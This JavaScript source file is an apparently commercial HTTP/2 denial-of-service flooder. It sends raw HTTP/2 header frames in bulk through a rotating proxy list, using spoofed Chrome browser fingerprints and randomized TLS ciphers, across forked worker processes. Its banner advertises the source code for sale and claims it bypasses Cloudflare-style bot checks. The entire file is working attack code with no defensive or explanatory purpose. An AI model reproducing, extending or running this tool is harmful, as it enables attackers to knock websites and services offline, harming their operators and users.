const { Command } = require('commander');
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');
const fs = require('fs');

process.on(`uncaughtException`, (e) => { console.log(e) });
process.on(`unhandledRejection`, (e) => { console.log(e) });

const prog = new Command();
prog
    .option('-u, --target <url>', 'Target URL')
    .option('-n, --connections <number>', 'Number of connections', parseInt)
    .option('-s, --time <seconds>', 'Time to run', parseInt)
    .option('-t, --threads <number>', 'Number of threads', parseInt)
    .option('-m, --streams <number>', 'Number of streams', parseInt)
    .option('-p, --proxy <proxy>', 'Proxy configuration')
    .option('-i, --postdata <data>', 'Post data')
    .option('-h, --headerdata <header...>', 'Header data')
    .option('-x, --options <options>', 'Custom options')
    .option('-r, --rate <rate>', 'Rate')
    .option('-c, --cookie <cookie>', 'Cookie')
    .option('-z, --protocol <version>', 'Protocol version', parseInt)
    .option('-d, --uuid <uuid>', 'UUID')
    .option('--referer <referer>', 'Referer')
    .option('--thresold <thresold>', 'Thresold', parseInt)
    .option('--valid <status>', 'Valid status')
    .option('--rechallenge <status>', 'Checking Rechallenge Status')
    .option('--verbose', 'Enable verbose output')
    .parse(process.argv);

const opts = prog.opts();
const trg = opts.target;
const time = opts.time;
const threads = opts.threads;
const rate = opts.rate;
const connections = opts.connections || 1;
const streams = opts.streams || 1;
const pFile = opts.proxy;
const pList = fs.readFileSync(pFile, 'utf8').replace(/\r/g, '').split('\n');
const trgUrl = new URL(trg);
const mainStat = [];
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
let statCounts = {};
let pIdx = 0;
let roundRobinIndex = 0;

let proxyStats = pList.map(p => ({
    p,
    failCount: 0,
    successCount: 0,
    priority: 0
}));

const BufWin = (val) => {
    const buf = Buffer.alloc(4);
    buf.writeUInt32BE(val, 0);
    return buf;
};

const FrEnc = (streamId, type, payload = "", flags = 0) => {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
};

const FrDec = (data) => {
    const lenType = data.readUInt32BE(0);
    const len = lenType >> 8;
    const type = lenType & 0xFF;
    let payload = "";

    if (len > 0) {
        payload = data.subarray(9, 9 + len);

        if (payload.length !== len)
            return null;
    }

    return { len, type, payload };
};

const Proxy = () => {
    if (proxyStats.every(proxy => proxy.priority !== 0)) {
        proxyStats.sort((a, b) => b.priority - a.priority);
    }

    const proxy = proxyStats[roundRobinIndex];
    roundRobinIndex = (roundRobinIndex + 1) % proxyStats.length;

    return proxy.priority === -1 ? Proxy() : proxy.p.split(":");
};

const Settings = (settings) => {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
};

const Ciphers = () => {
    const available = [
        'AES128-GCM-SHA256',
        'AES256-GCM-SHA384',
        'AES128-SHA256',
        'AES256-SHA256',
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES256-GCM-SHA384'
    ];

    const num = Math.floor(Math.random() * available.length) + 1;
    const shuffled = available.sort(() => Math.random() - 0.5);
    return shuffled.slice(0, num).join(':');
};

const Message = function (text) {
    const colors = {
        reset: '\x1b[0m',
        bright: '\x1b[1m',
        green: '\x1b[32m',
        yellow: '\x1b[33m',
        red: '\x1b[31m',
    };

    if (typeof text === 'string') {
        console.log(`${colors.green}${text}${colors.reset}`);
    } else if (typeof text === 'object') {
        console.log(`${colors.yellow}${JSON.stringify(text, null, 2)}${colors.reset}`);
    }
};

const Headers = () => {
    let vrsn = Math.floor(Math.random() * 29) + 100;
    let pltfrm = Math.random() > 0.5 ? "Windows" : "Macintosh";
    let ua = `Mozilla/5.0 (${pltfrm === "Windows" ? "Windows NT 10.0; Win64; x64" : "Macintosh; Intel Mac OS X 10_15_7"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${vrsn}.0.0.0 Safari/537.36`;

    let headers = {
        ':method': opts.postdata ? "POST" : "GET",
        ':authority': trgUrl.hostname,
        ':scheme': 'https',
        ':path': trgUrl.pathname,
        "sec-ch-ua": `"Not)A;Brand";v="99", "Google Chrome";v="${vrsn}", "Chromium";v="${vrsn}"`,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": `"${pltfrm}"`,
        "upgrade-insecure-requests": "1",
        "user-agent": ua,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": Lang(),
        ...(opts.cookie && opts.cookie.length > 0 ? { "cookie": opts.cookie } : {}),
        "priority": "u=0, i",
        ...(opts.postdata ? {
            "content-type": "application/x-www-form-urlencoded",
            "content-length": Buffer.byteLength(opts.postdata).toString()
        } : {})
    };

    if (opts.headerdata) {
        const hdrPairs = Array.isArray(opts.headerdata) ? opts.headerdata : [opts.headerdata];
        for (const pair of hdrPairs) {
            const [header, value] = pair.split('@');
            if (header && value) {
                headers[header] = value;
            }
        }
    }

    return headers;
};

const Lang = () => {
    const baseLangQuality = Math.random() < 0.05 ? (0.7 + Math.random() * 0.2).toFixed(1) : '0.7';
    let baseLang = `en-US,en;q=${baseLangQuality}`;

    const additionalLangs = [
        "ru-RU,ru;q=0.8", "fr-FR,fr;q=0.7", "de-DE,de;q=0.9", "es-ES,es;q=0.6",
        "zh-CN,zh;q=0.5", "it-IT,it;q=0.7", "ja-JP,ja;q=0.6", "ko-KR,ko;q=0.6",
        "pt-PT,pt;q=0.8", "nl-NL,nl;q=0.7", "sv-SE,sv;q=0.3", "no-NO,no;q=0.5",
        "da-DK,da;q=0.9", "fi-FI,fi;q=0.2", "pl-PL,pl;q=0.3", "cs-CZ,cs;q=0.5",
        "hu-HU,hu;q=0.7", "tr-TR,tr;q=0.8", "el-GR,el;q=0.9", "he-IL,he;q=0.5",
        "ar-SA,ar;q=0.3", "hi-IN,hi;q=0.7", "th-TH,th;q=0.6"
    ];

    if (Math.random() < 0.03) {
        const randomLangs = Array.from({ length: 2 + Math.floor(Math.random() * 3) }, () => additionalLangs[Math.floor(Math.random() * additionalLangs.length)]);
        baseLang += `,${randomLangs.join(',')}`;
    }

    return baseLang;
};

const Flooder = () => {
    for (let connectionIndex = 0; connectionIndex < connections; connectionIndex++) {
        const [host, port] = Proxy();
        const socket = net.connect(Number(port), host, () => {
            socket.once('data', () => {
                const tlsSocket = tls.connect({
                    socket: socket,
                    ALPNProtocols: ['h2'],
                    servername: trgUrl.host,
                    minVersion: 'TLSv1.2',
                    maxVersion: 'TLSv1.3',
                    ciphers: Ciphers(),
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
                }, () => {
                    let streamId = 1;
                    let data = Buffer.alloc(0);
                    let hpack = new HPACK();
                    hpack.setTableSize(4096);

                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        FrEnc(0, 4, Settings([
                            [1, 65536],
                            [2, 0],
                            [4, 6291456],
                            [6, 262144],
                        ])),
                        FrEnc(0, 8, BufWin(15663105))
                    ];

                    tlsSocket.on('data', (eventData) => {
                        data = Buffer.concat([data, eventData]);
                        while (data.length >= 9) {
                            const frame = FrDec(data);
                            if (frame != null) {
                                data = data.subarray(frame.len + 9);

                                if (frame.type == 4 && frame.flags == 0) {
                                    tlsSocket.write(FrEnc(0, 4, "", 1));
                                }

                                if (frame.type == 0) {
                                    let winSize = frame.len;
                                    if (winSize < 60000) {
                                        let incWin = 65536 - winSize;
                                        winSize += incWin;
                                        const updateWin = Buffer.alloc(4);
                                        updateWin.writeUInt32BE(incWin, 0);
                                        tlsSocket.write(FrEnc(0, 8, updateWin));
                                    }
                                }

                                if (frame.type == 1) {
                                    const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];
                                    if (!statCounts[status])
                                        statCounts[status] = 0;
                                    statCounts[status]++;

                                    if (status === 403) {
                                        proxyStats[pIdx].failCount++;
                                    } else {
                                        proxyStats[pIdx].successCount++;
                                    }
                                }

                                if (frame.type == 7) {
                                    proxyStats[pIdx].failCount++;
                                    tlsSocket.end();
                                }
                            } else {
                                break;
                            }
                        }
                    });

                    tlsSocket.write(Buffer.concat(frames));

                    const Request = () => {
                        if (tlsSocket.destroyed) {
                            return;
                        }

                        for (let i = 0; i < streams; i++) {
                            for (let j = 0; j < rate; j++) {
                                const currentProxy = proxyStats[pIdx];
                                if(currentProxy.failCount > 10) break;
                                tlsSocket.write(Buffer.concat([FrEnc(streamId, 1, Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), hpack.encode(Object.entries(Headers()).filter(([key, value]) => value != null))]), 0x25)]));
                                streamId += 2;
                            }
                        }
                        const currentProxy = proxyStats[pIdx];
                        currentProxy.priority = currentProxy.successCount - currentProxy.failCount;
                        Message(`[fff1-1] Stats proxy | Failed: ${currentProxy.failCount} | Success: ${currentProxy.successCount}`);
                    };

                    setTimeout(Request, 1000);

                }).on('error', () => {
                    tlsSocket.destroy();
                });
            });

            socket.write(`CONNECT ${trgUrl.host}:443 HTTP/1.1\r\nHost: ${trgUrl.host}:443\r\nProxy-Connection: keep-alive\r\n\r\n`);
        }).once('error', () => { }).once('close', () => {
            Flooder();
        });
    }
};

if (cluster.isMaster) {
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    const workerStat = {};

    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workerStat[worker.id] = [worker, message];
    });

    Message(`Create method: @mitigationser | Source code : 1000$ | Custom method\nSystem AI-code // Legit code // Human CF`);
    Message(`Target: ${opts.target || '*'} | Time: ${opts.time || '*'}`);
    Message(`Threads: ${opts.threads || '*'} | Streams: ${opts.streams || '*'} | Connections: ${opts.connections || '*'} | Rate: ${opts.rate || '*'}`);

    setInterval(() => {
        let combinedStat = {};
        for (let w in workerStat) {
            if (workerStat[w][0].state == 'online') {
                for (let st of workerStat[w][1]) {
                    for (let code in st) {
                        if (combinedStat[code] == null)
                            combinedStat[code] = 0;

                        combinedStat[code] += st[code];
                    }
                }
            }
        }

        if (`${JSON.stringify(combinedStat, null, 2)}` != "{}") Message(`Status: ${JSON.stringify(combinedStat, null, 2)}`);
        else Message(`[0x1] Have problems, contact the administrator: @mitigationser`);
    }, 950);

    setTimeout(() => process.exit(Message('Primary process exiting...')), time * 1000);

} else {
    setInterval(Flooder);

    setInterval(() => {
        if (mainStat.length >= 4)
            mainStat.shift();

        mainStat.push(statCounts);
        statCounts = {};
        process.send(mainStat);
    }, 950);

    setTimeout(() => process.exit(Message(`Worker ${process.pid} exiting...`)), time * 1000);
}